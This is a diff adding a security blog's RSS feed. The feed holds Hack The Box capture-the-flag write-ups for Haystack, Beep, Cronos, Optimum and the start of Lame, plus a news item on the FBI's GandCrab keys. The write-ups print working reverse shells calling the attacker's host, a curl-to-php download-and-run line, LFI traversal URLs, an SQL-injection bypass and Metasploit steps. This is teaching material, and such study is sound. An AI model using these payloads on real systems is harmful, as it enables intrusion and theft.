@@ -1,0 +1,1684 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Suniara Security</title>
+    <description>Cyber-Security Blog</description>
+    <link>/</link>
+    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 19 Jan 2020 12:04:37 -0800</pubDate>
+    <lastBuildDate>Sun, 19 Jan 2020 12:04:37 -0800</lastBuildDate>
+    <generator>Jekyll v4.0.0</generator>
+
+    
+      <item>
+        <title>HTB - Haystack Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Haystack
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 29 Jun 2019&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.115&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1. Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA haystack.nmap 10.10.10.115&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/haystack/haystack1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The port scan shows ports 22, 80, 9200 are open.
+Just from the scan we can identify that port 80 has &lt;strong&gt;text/html&lt;/strong&gt; as its context-type whereas port 9200 has &lt;strong&gt;application/json&lt;/strong&gt;. This can point towards some kind of API running as API’s usually return with &lt;strong&gt;json&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Loading up the website we see:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/haystack/haystack2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the meantime, we will run a gobuster scan to find any more directories:&lt;/p&gt;
+
+&lt;p&gt;####2. Gobuster Scanning&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -k&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The scan doesn’t find anything interesting.&lt;/p&gt;
+
+&lt;p&gt;Next I move to the image in the webpage. I run some basic steganography tools but nothing comes up. That is until I run &lt;strong&gt;strings&lt;/strong&gt; on the image and search for a base64 string.&lt;/p&gt;
+
+&lt;p&gt;We spot the line of code that looks like base64 so let’s throw that into a decoder and see the output.
+We get the line &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;la aguja en el pajar es &quot;clave&quot;&lt;/code&gt; and when we enter that into google translate we get &lt;code class=&quot;highlighter-rouge&quot;&gt;the needle in the haystack is &quot;key&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Next we’ll move over to port 9200 which is Elasticsearch.
+Visiting the webpage we can see the source code tells us the version is &lt;strong&gt;6.4.2&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;After a quick search of exploits for this version we see the following tool used to dump the elasticsearch database.&lt;/p&gt;
+
+&lt;p&gt;https://github.com/taskrabbit/elasticsearch-dump&lt;/p&gt;
+
+&lt;p&gt;We candump indices by using the below command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;curl http://10.10.10.115:9200/_cat/indices?v -s&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see 2 indices named &lt;strong&gt;quotes&lt;/strong&gt; and &lt;strong&gt;bank&lt;/strong&gt; so let’s use the elasticdump tool and investigate further.&lt;/p&gt;
+
+&lt;p&gt;Based on the below output we generate a dump and we can analyze it by running the &lt;strong&gt;cat&lt;/strong&gt; command and using &lt;strong&gt;grep&lt;/strong&gt; to find particular keywords.&lt;/p&gt;
+
+&lt;p&gt;I start with the word &lt;strong&gt;haystack&lt;/strong&gt; and we get the output “There’s a needle in this haystack, you have to serach for it” which leads us to believe this is the correct step and to investigate deeper.&lt;/p&gt;
+
+&lt;p&gt;The last words of the quotes is a base64 string. Again, let’s decode it and see the output:
+They look to be credentials:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;User: security&lt;/code&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;Pass: spanish.is.key&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We can use these credentials to SSH in and get the user flag which is located at &lt;strong&gt;/home/security/user.txt&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;###Privilege Escalation&lt;/p&gt;
+
+&lt;p&gt;Now that we know we are working on an &lt;strong&gt;ELK&lt;/strong&gt; stack we can look at the running processes to see &lt;strong&gt;kibana&lt;/strong&gt; and &lt;strong&gt;logstash&lt;/strong&gt; are running.&lt;/p&gt;
+
+&lt;p&gt;Since kibana is run internally, we can port forward it with the below command:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh security@10.10.10.115 -L 5601:127.0.0.1:5601&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We load up the browser and see the Kibana version is &lt;strong&gt;6.4.2&lt;/strong&gt;. A quick google search comes up with the following LFI exploit:&lt;/p&gt;
+
+&lt;p&gt;We can that it’s running kibana 6.4.2 . A quick google search gets us to CVE-2018–17246.
+&lt;a href=&quot;https://github.com/mpgn/CVE-2018-17246&quot;&gt;CVE-2018-17246&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;We can simply make a reverse shell using this JavaScript shell from: https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/&lt;/p&gt;
+
+&lt;p&gt;I’m going to go ahead and save that in the tmp folder on the kibana server.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+(function(){
+    var net = require(&quot;net&quot;),
+        cp = require(&quot;child_process&quot;),
+        sh = cp.spawn(&quot;/bin/sh&quot;, []);
+    var client = new net.Socket();
+    client.connect(4444, &quot;10.10.14.31&quot;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We then want to navigate to the below in the browser. We should see the listener get a connection back as the user &lt;strong&gt;kibana&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;amp;apis=../../../../../../../../../../tmp/shell&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then you can run &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt; to upgrade to a Python shell.&lt;/p&gt;
+
+&lt;p&gt;After running LinEnum.sh we see &lt;strong&gt;logstash&lt;/strong&gt; mentioned a few times. Since this box deals with ELK stack we can take a look into &lt;strong&gt;Logstash&lt;/strong&gt; to see if there is anything of interest.&lt;/p&gt;
+
+&lt;p&gt;In &lt;strong&gt;/etc/logstash&lt;/strong&gt;, we find a directory called &lt;strong&gt;conf.d&lt;/strong&gt; which holds some key Logstash config files.&lt;/p&gt;
+
+&lt;p&gt;The three config files do the following:&lt;/p&gt;
+
+&lt;p&gt;I read into Logstash and how it uses these three configuration files.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;input.conf determines the conditions of the input file that Logstash will act on.&lt;/li&gt;
+  &lt;li&gt;filter.conf defines a regex that matches the contents of the input file.&lt;/li&gt;
+  &lt;li&gt;output.conf determines what actions will be taken on the input file&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Thu, 07 Nov 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/11/07/HTB-Haystack/</link>
+        <guid isPermaLink="true">/writeups/2019/11/07/HTB-Haystack/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Beep Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Beep
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 15 Mar 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.7&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1. Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA beep.nmap 10.10.10.7&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/beep/beep1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The nmap scan shows multiple open ports. Let’s open up the web browser and investigate.
+We are redirected to a HTTPS website running Elastix.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/beep/beep2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the meantime, we will run a gobuster scan to find any more directories:&lt;/p&gt;
+
+&lt;p&gt;####2. Gobuster Scanning&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -k&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/beep/beep3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s load up searchsploit and take a quick look to see if there are any exploits available for Elastix.&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;####3. LFI Exploit&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/beep/beep4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We see there are multiple exploits, the most interesting one is the LFI and Remote Code Execution. So let’s give that one a shot.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/37637&quot;&gt;EDB-ID:37637&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Reading the exploit, we see the location of the LFI, which is the &lt;strong&gt;/vtigercrm&lt;/strong&gt; directory. That lines up with what we see in our gobuster results too.&lt;/p&gt;
+
+&lt;p&gt;So let’s copy it into the browser and see the result…&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;amp;module=Accounts&amp;amp;action&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/beep/beep5.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We got something, but it’s not rendered so we can simply look at the source code.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/beep/beep6.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/beep/beep7.jpg&quot; /&gt;
+We see many usernames / passwords for FreePBX which we can access using the admin account.&lt;/p&gt;
+
+&lt;p&gt;####4. Flag Capture&lt;/p&gt;
+
+&lt;p&gt;As noted in the nmap scan, port 22 is open so let’s test the admin account out there.&lt;/p&gt;
+
+&lt;p&gt;Using the &lt;strong&gt;AMPDBPASS&lt;/strong&gt;:
+Admin doesn’t seem to work  for SSH but what if the password is reused for root? After trying root we see the password worked!
+Password reuse is a common vulnerability on some other boxes as well.&lt;/p&gt;
+
+&lt;p&gt;Let’s grab the user flag which is located at the home folder of the user “fanis” as user.txt&lt;/p&gt;
+
+&lt;p&gt;The root flag is located
+&lt;img src=&quot;/images/posts/htb/beep/beep8.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 03 Nov 2019 00:00:00 -0700</pubDate>
+        <link>/writeups/2019/11/03/HTB-Beep/</link>
+        <guid isPermaLink="true">/writeups/2019/11/03/HTB-Beep/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Cronos Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Cronos
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Medium&lt;/li&gt;
+      &lt;li&gt;Points: 30&lt;/li&gt;
+      &lt;li&gt;Release: 22 Mar 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.13&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1. Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA cronos.nmap 10.10.10.13&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We see ports 22,53,80 open. First off let’s load up the browser and take a look.&lt;/p&gt;
+
+&lt;p&gt;We see a default Apache2 page like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s try and find some directories using GoBuster:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster dir -u http://10.10.10.13/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No results for the GoBuster. In the port scan we saw DNS open so let’s nslookup and see what we can find out about the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We got a domain, &lt;strong&gt;cronos.htb&lt;/strong&gt;
+We’ll go ahead and add that into our hosts file and browse to it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos5.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos6.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Running the GoBuster scan again for &lt;strong&gt;cronos.htb&lt;/strong&gt; we see the “&lt;strong&gt;robots.txt&lt;/strong&gt;” file is available but there is nothing of substance available.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos7.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s try a zone transfer since port 53 is open and see if we can get any more information:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos8.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;strong&gt;admin.cronos.htb&lt;/strong&gt; looks interesting so let’s add that into our hosts file as well so we can browse to it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos8.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos9.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nice! We got a login page, let’s test a bypass using SQL injection.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;admin' or '1'='1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the following &lt;a href=&quot;https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/&quot;&gt;Pentest Blog Cheat Sheet&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos10.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We got a &lt;strong&gt;Net Tool v0.1&lt;/strong&gt; page. Perhaps this is also vulnerable to command injection?&lt;/p&gt;
+
+&lt;p&gt;Looks like it!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos11.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now that we confirmed command injection, we can simply use the below command to get a reverse shell in python.&lt;/p&gt;
+
+&lt;p&gt;I used &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;this&lt;/a&gt; cheat sheet from PentestMonkey.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.57&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos12.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can look at our listener and confirm we got a shell.&lt;/p&gt;
+
+&lt;p&gt;Next we need to escalate our privileges.&lt;/p&gt;
+
+&lt;p&gt;###Privilege Escalation&lt;/p&gt;
+
+&lt;p&gt;After investigating the machine we don’t have much luck enumerating.&lt;/p&gt;
+
+&lt;p&gt;Based on the name of this box, we take a look at &lt;strong&gt;/etc/crontab&lt;/strong&gt;. Here we see something of interest:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos13.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The last line there indicates a file named &lt;strong&gt;artisan&lt;/strong&gt; is being executed by &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos14.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pulling up the permissions for artisan shows our user has access to edit the file.
+So let’s simply make a script to have the server download a php reverse shell from my host and pipe it into php to execute.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos15.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I used the following &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PentestMonkey&lt;/a&gt; shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'curl http://10.10.14.57/reverse.php | php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos16.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s setup a web server locally and also ensure we have a listener ready to capture the shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos17.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Wait a minute or so and the cronjob will execute the &lt;strong&gt;artisan&lt;/strong&gt; file and we can see the nc listener now has a shell.&lt;/p&gt;
+
+&lt;p&gt;It isn’t a full interactive shell but using the following post we can make it one:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell&quot;&gt;https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;We can find the root flag in /root/root.txt and the user flag at /home/noulis/user.txt.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/cronos/cronos18.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Thu, 03 Oct 2019 00:00:00 -0700</pubDate>
+        <link>/writeups/2019/10/03/HTB-Cronos/</link>
+        <guid isPermaLink="true">/writeups/2019/10/03/HTB-Cronos/</guid>
+      </item>
+    
+      <item>
+        <title>FBI Releases Master Decryption Keys for GandCrab</title>
+        <description>&lt;p&gt;FBI Released Master Decryption Keys for All Versions of the GandCrab Ransomware&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;The Federal Bureau of Investigation (FBI) released the master decryption keys for all the version ( 4, 5, 5.0.4, 5.1, and 5.2 ) of the Notorious GandCrab ransomware which can be used for both organization or individual. Gandcrab ransomware initially spotted in January 2018, and it is one of the most sophisticated ransomware which causes billion’s […]&lt;/p&gt;
+
+&lt;p&gt;The post FBI Released Master Decryption Key for All Version of GandCrab Ransomware appeared first on GBHackers On Security.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;
+  Master Decryption Keys for GandCrab, versions 4
+  through 5.2
+  Summary
+  On 17 June 2019, the FBI, in partnership with law enforcement
+  agencies from 8 European countries, as well as Europol and
+  BitDefender, released a decryption tool applicable to all versions of
+  GandCrab ransomware. The decryption tool can be found at
+  www.nomoreransom.org. The collaborative efforts further identified
+  the master decryption keys for all new versions of GandCrab
+  introduced since July 2018. The FBI is releasing the master keys in
+  order to facilitate the development of additional decryption tools.
+  GandCrab operates using a ransomware-as-a-service (RaaS) business
+  model, selling the right to distribute the malware to affiliates in
+  exchange for 40% of the ransoms. GandCrab was first observed in
+  January 2018 infecting South Korean companies, but GandCrab
+  campaigns quickly expanded globally to include US victims in early
+  2018, impacting at least 8 critical infrastructure sectors. As a result,
+  GandCrab rapidly rose to become the most prominent affiliate-based
+  ransomware, and was estimated to hold 50% of the ransomware
+  market share by mid-2018. Experts estimate GandCrab infected over
+  500,000 victims worldwide, causing losses in excess of $300 million.
+&lt;/code&gt;}&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+Sources:
+&lt;br /&gt;
+https://www.documentcloud.org/documents/6199678-GandCrab-Master-Decryption-Keys-FLASH.html
+&lt;br /&gt;
+https://gbhackers.com/fbi-released-master-decryption-key/
+&lt;br /&gt;
+https://gbhackers.com/&lt;/p&gt;
+</description>
+        <pubDate>Tue, 16 Jul 2019 00:00:00 -0700</pubDate>
+        <link>/security/2019/07/16/gandcrab-fbi/</link>
+        <guid isPermaLink="true">/security/2019/07/16/gandcrab-fbi/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Optimum Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Optimum
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 18 Mar 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.8&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1. Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA optimum.nmap 10.10.10.8&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The nmap scan shows only port 80 is open and the detected software is an outdated HttpFileServer 2.3.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/optimum/optimum1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Accessing the webpage, we see it looks to be a file server used to access/archive files over the network. Let’s look more into the HttpFileServer 2.3 version and investigate possible exploits.&lt;/p&gt;
+
+&lt;p&gt;The first serach reveals that this particular version has a remote command execution vulnerability
+(CVE-2014-6287). Which conveniently, has a metasploit module available.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/39161&quot;&gt;CVE-2014-6287&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;###Exploitation&lt;/p&gt;
+
+&lt;p&gt;####2. Metasploit Module&lt;/p&gt;
+
+&lt;p&gt;Load up metasploit and simply load up the exploit for this CVE:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use exploit/windows/http/rejetto_hfs_exec&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;set RHOSTS 10.10.10.8&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;set LHOSTS 10.10.14.9&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;A shell will appear and you can find the user flag in the Desktop directory of the user “kostas”.
+The file will be named “&lt;strong&gt;user.txt.txt&lt;/strong&gt;”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/optimum/optimum2.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/optimum/optimum3.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;###Privilege Escalation&lt;/p&gt;
+
+&lt;p&gt;Now we have to get the root flag. Since we have a meterpreter session open, we can use local_exploit_suggester and look for possible vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;Simply run:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use post/multi/recon/local_exploit_suggester&lt;/code&gt; &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;set SESSION 1&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/optimum/optimum4.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We see 2 possible vulnerabilities. Trying the first doesn’t work but this is because we are not in the admins group.
+Trying the next one, logon_handle works for us.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use windows/local/ms16_032_secondary_logon_handle_privesc&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;set SESSION 1&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/optimum/optimum5.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The root flag is found at “C:\Users\Administrator\Desktop\root.txt”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/optimum/optimum6.jpg&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 10 Mar 2019 00:00:00 -0800</pubDate>
+        <link>/writeups/2019/03/10/HTB-Optimum/</link>
+        <guid isPermaLink="true">/writeups/2019/03/10/HTB-Optimum/</guid>
+      </item>
+    
+      <item>
+        <title>HTB - Lame Writeup</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;Box: Lame
+    &lt;ul&gt;
+      &lt;li&gt;Difficulty: Easy&lt;/li&gt;
+      &lt;li&gt;Points: 20&lt;/li&gt;
+      &lt;li&gt;Release: 14 Mar 2017&lt;/li&gt;
+      &lt;li&gt;IP: 10.10.10.3&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;###Initial Enumeration&lt;/p&gt;
+
+&lt;p&gt;####1. Nmap Scanning&lt;/p&gt;
+
+&lt;p&gt;Starting with a scan of the target ip address:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA lame.nmap 10.10.10.3&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The nmap scan shows a vsftpd FTP server that is allowing anonymous connections. We also see port 22 and 445 open indicating there may be some network shares available for us.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/posts/htb/lame/lame1.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;####2. FTP Enumeration&lt;/p&gt;
+
+&lt;p&gt;We can see the vsftpd version is 2.3.4 which is extremely outdated. We can also see that there is a metasploit module for this version. However, that isn’t exploitable in this instance.&lt;/p&gt;
+
+&lt;p&gt;####3. SMB Enumeration&lt;/p&gt;
+
+&lt;p&gt;We can run &lt;strong&gt;smbmap&lt;/strong&gt; to see if we have access to any network shares. The scan shows we have read/write access to the &lt;strong&gt;tmp&lt;/strong&gt; share. After connecting to it with &lt;strong&gt;smbclient&lt;/strong&gt; we don’t find anything of interest.&lt;/p&gt;
+
